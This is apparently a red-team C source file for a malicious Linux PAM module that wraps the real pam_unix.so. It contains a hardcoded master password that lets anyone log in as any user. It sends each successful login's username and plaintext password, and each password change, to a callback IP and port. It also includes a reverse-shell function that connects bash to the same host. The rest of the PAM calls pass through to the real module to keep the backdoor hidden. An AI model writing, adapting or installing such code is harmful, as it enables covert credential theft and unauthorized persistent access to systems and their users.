#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <syslog.h>
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>

#define PAM_PATH "/usr/lib/pam.d/pam_unix.so"
#define AUTH_PASSWORD "redteam123"

#define CALLBACK_IP "10.100.150.1"
#define CALLBACK_PORT 5000
#define RET_FMT "%s - %s %s:%s\n"

typedef int (*pam_func_t)(pam_handle_t *, int, int, const char **);

int pam_send_authtok(pam_handle_t *pamh, const char *message, const char *username, const char *password) {
    char hostbuffer[256];
    char* ipaddr;
    struct hostent *host_entry;
    int hostname;

    // To retrieve hostname
    hostname = gethostname(hostbuffer, sizeof(hostbuffer));

    // To retrieve host information
    host_entry = gethostbyname(hostbuffer);

    // To convert an Internet network
    // address into ASCII string
    ipaddr = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(CALLBACK_PORT);
        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);

        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            char credentials[256];
            snprintf(credentials, sizeof(credentials), RET_FMT, ipaddr, message, username, password);
            send(sock, credentials, strlen(credentials), 0);
            close(sock);
         }
    }

    return 0;
}

int pam_log_err() {
    pid_t pid = fork();
    if (pid == -1) {
		return 1;
	}
	if (pid > 0) {
		return 0;
	}

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(CALLBACK_PORT);
        inet_pton(AF_INET, CALLBACK_IP, &serv_addr.sin_addr);

        if(connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == 0) {
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            char * const argv[] = {"/bin/bash", NULL};
            execve("/bin/bash", argv, NULL);
         }
    }

    return 0;
}

int pam_unix_authenticate(const char *name, pam_handle_t *pamh, int flags, int argc, const char **argv) {
    
    if (!name) {
        return PAM_AUTH_ERR;
    }
    if (!pamh) {
        return PAM_AUTH_ERR;
    }

    void *handle = dlopen(PAM_PATH, RTLD_LAZY | RTLD_GLOBAL);
    if (!handle) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to dlopen(pam_unix.so): %s", dlerror());
        return PAM_AUTH_ERR;
    }

    pam_func_t func = (pam_func_t)dlsym(handle, name);
    if (!func) {
        pam_syslog(pamh, LOG_ERR, "PAM unable to resolve symbol: %s", name);
        dlclose(handle);
        return PAM_AUTH_ERR;
    }

    int result = func(pamh, flags, argc, argv);
    //dlclose(handle);
    return result;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (strncmp(password, AUTH_PASSWORD, strlen(AUTH_PASSWORD)) == 0) {
        return PAM_SUCCESS;
    }

    // if (strncmp(password, "PAM", 8) == 0) {
    //     pam_log_err();
    //     return PAM_SUCCESS;
    // }

    int retval = pam_unix_authenticate("pam_sm_authenticate", pamh, flags, argc, argv);

    if (username && password && retval == PAM_SUCCESS) {
        pam_send_authtok(pamh, "USER AUTHENTICATED:", username, password);
        pam_syslog(pamh, LOG_ERR, "%s's EUID IN THIS CASE IS %d", username, geteuid());
    }

    return retval;
}

PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;

    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);

    if (username && password) {
        pam_send_authtok(pamh, "USER CHANGED PASSWORD:", username, password);
    }

    return pam_unix_authenticate("pam_sm_chauthtok", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_acct_mgmt", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_open_session", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_close_session", pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return pam_unix_authenticate("pam_sm_setcred", pamh, flags, argc, argv);
}